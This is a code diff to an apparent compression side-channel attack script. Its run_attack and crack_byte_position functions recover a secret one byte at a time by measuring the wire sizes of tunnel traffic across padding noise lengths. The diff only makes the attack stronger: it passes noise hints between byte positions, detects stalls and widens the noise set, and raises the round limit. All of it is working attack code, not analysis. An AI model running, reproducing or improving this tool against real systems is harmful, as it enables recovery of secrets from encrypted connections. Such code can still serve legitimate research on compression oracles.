@@ -183,23 +183,40 @@ async def crack_byte_position(
     min_margin: int,
     max_rounds: int,
     log_prefix: str,
-) -> tuple[bytes, dict[bytes, int]]:
+    hint_noise: list[int] | None = None,
+) -> tuple[bytes, dict[bytes, int], list[int]]:
     """Recover one byte, repeating rounds until *margin >= min_margin*.
 
-    Each round sweeps noise lengths with fresh tunnel connections.
-    Two progressive optimisations reduce work in later rounds:
+    Returns ``(best_candidate, cumulative_sums, final_active_noise)``
+    so the caller can pass ``final_active_noise`` as ``hint_noise``
+    to the next byte position.
 
+    Three progressive optimisations reduce work:
+
+    * **Noise hint from previous position**: if *hint_noise* is
+      provided (the productive noise lengths from the preceding byte
+      position, expanded by ±1 to cover the ~1-byte prefix-growth
+      shift), round 1 uses that small set instead of a full 8-sweep.
+      If it produces no signal, round 2 falls back to the full set.
+    * **Adaptive noise sweep**: after the first round that uses the
+      full set, noise lengths with no differential signal are dropped.
     * **Candidate elimination**: after each round, candidates whose
       cumulative sum exceeds ``best_sum + min_margin`` are dropped.
-    * **Adaptive noise sweep**: after round 1, noise lengths where
-      every candidate produced the same wire size (no padding-boundary
-      crossing) are dropped.  Neighbours of productive noise lengths
-      are kept to handle channel-number jitter that shifts the
-      crossing between rounds.
     """
     sums: dict[bytes, int] = {c: 0 for c in alphabet}
     active = list(alphabet)
-    active_noise = list(noise_lengths)
+    prev_margin = 0
+    stall_count = 0
+
+    # Start with the hint set (from the previous position) if
+    # available, otherwise use the full set.
+    if hint_noise and len(hint_noise) < len(noise_lengths):
+        active_noise = list(hint_noise)
+    else:
+        active_noise = list(noise_lengths)
+
+    all_noise = set(noise_lengths)
+    did_initial_prune = False
 
     for rnd in range(1, max_rounds + 1):
         round_sums, round_per_nl = await _sweep_round(
@@ -223,38 +240,59 @@ async def crack_byte_position(
             active = [c for c, _ in ranked[:2]]
         eliminated = before - len(active)
 
-        # Adaptive noise: after the first full sweep, keep only noise
-        # lengths that showed any differential signal (not all
-        # candidates at the same wire size), plus their immediate
-        # neighbours to handle jitter.  Never drop below 3.
-        noise_pruned = 0
-        if rnd == 1 and len(active_noise) == len(noise_lengths):
+        # Adaptive noise: after the first round, prune noise lengths
+        # that showed no differential signal (keep productive +
+        # neighbours, minimum 3).
+        noise_delta = 0
+        if not did_initial_prune:
             productive = set()
             for nl in active_noise:
                 vals = list(round_per_nl[nl].values())
                 if min(vals) < max(vals):
                     productive.add(nl)
             if productive:
+                n = noise_lengths[-1] + 1  # modulus (typically 8)
                 keep = set()
                 for nl in productive:
                     keep.add(nl)
-                    if nl - 1 in set(noise_lengths):
-                        keep.add(nl - 1)
-                    if nl + 1 in set(noise_lengths):
-                        keep.add(nl + 1)
+                    keep.add((nl - 1) % n)
+                    keep.add((nl + 1) % n)
                 new_noise = sorted(keep)
                 if len(new_noise) >= 3:
-                    noise_pruned = len(active_noise) - len(new_noise)
+                    noise_delta = len(new_noise) - len(active_noise)
                     active_noise = new_noise
+            did_initial_prune = True
+
+        # Stall detection: if margin hasn't grown for 2 consecutive
+        # rounds and we're using a reduced noise set, expand by ±1
+        # to recover crossing noise_lengths lost to channel jitter.
+        if margin <= prev_margin and eliminated == 0:
+            stall_count += 1
+        else:
+            stall_count = 0
+        prev_margin = margin
+
+        if stall_count >= 2 and len(active_noise) < len(noise_lengths):
+            n = noise_lengths[-1] + 1
+            expanded = set(active_noise)
+            for nl in list(expanded):
+                expanded.add((nl - 1) % n)
+                expanded.add((nl + 1) % n)
+            new_noise = sorted(expanded)
+            noise_delta = len(new_noise) - len(active_noise)
+            active_noise = new_noise
+            stall_count = 0
+            LOG.info("%s round=%d stall, expanding noise",
+                     log_prefix, rnd)
 
         LOG.info(
             "%s round=%d best=%r sum=%d  2nd=%r sum=%d  "
-            "margin=%d  alive=%d (-%d)  noise=%d (-%d)",
+            "margin=%d  alive=%d (-%d)  noise=%d (%+d)",
             log_prefix, rnd,
             best.decode("latin-1"), best_sum,
             second.decode("latin-1"), second_sum,
             margin, len(active), eliminated,
-            len(active_noise), noise_pruned,
+            len(active_noise), noise_delta,
         )
         if margin >= min_margin:
             break
@@ -262,7 +300,7 @@ async def crack_byte_position(
         LOG.warning("%s margin=%d after %d rounds (threshold=%d)",
                     log_prefix, margin, max_rounds, min_margin)
 
-    return best, sums
+    return best, sums, active_noise
 
 
 # ---------------------------------------------------------------------------
@@ -279,7 +317,7 @@ async def run_attack(
     settle: float = 0.003,
     flush_bytes: int = 33000,
     min_margin: int = 16,
-    max_rounds: int = 16,
+    max_rounds: int = 64,
 ) -> dict[str, Any]:
     if noise_lengths is None:
         noise_lengths = list(range(8))
@@ -298,11 +336,23 @@ async def run_attack(
     started = time.time()
     recovered = b""
     history: list[dict[str, Any]] = []
+    prev_noise: list[int] | None = None  # carried across positions
 
     timeout = aiohttp.ClientTimeout(total=1800)
     async with aiohttp.ClientSession(timeout=timeout) as session:
         for pos in range(max_length):
-            best, sums = await crack_byte_position(
+            # Build a noise hint from the previous position's active
+            # set, shifted by +1 mod 8.  The prefix grew by one byte,
+            # increasing the compressed size by ~1 byte, so the
+            # padding-boundary crossing moves one noise_len earlier
+            # (i.e. the productive noise_len index increases by 1).
+            hint: list[int] | None = None
+            if prev_noise is not None:
+                nl_set = set(noise_lengths)
+                hint = sorted({(nl + 1) % (noise_lengths[-1] + 1)
+                               for nl in prev_noise} & nl_set)
+
+            best, sums, prev_noise = await crack_byte_position(
                 session, packet_log,
                 prefix=known_prefix + recovered,
                 alphabet=alphabet,
@@ -312,6 +362,7 @@ async def run_attack(
                 min_margin=min_margin,
                 max_rounds=max_rounds,
                 log_prefix=f"pos {pos:2d}",
+                hint_noise=hint,
             )
             ranked = [
                 (k.decode("latin-1"), v)
